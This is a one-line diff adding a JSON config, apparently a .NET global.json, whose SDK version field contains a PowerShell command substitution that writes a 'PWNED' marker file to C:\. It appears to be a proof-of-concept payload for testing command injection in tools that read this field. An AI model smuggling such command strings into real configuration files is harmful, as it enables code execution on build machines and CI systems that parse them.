@@ -1,0 +1,1 @@
+{"sdk":{"version":"$(Set-Content -Path C:\\poc_marker.txt -Value PWNED)"}}
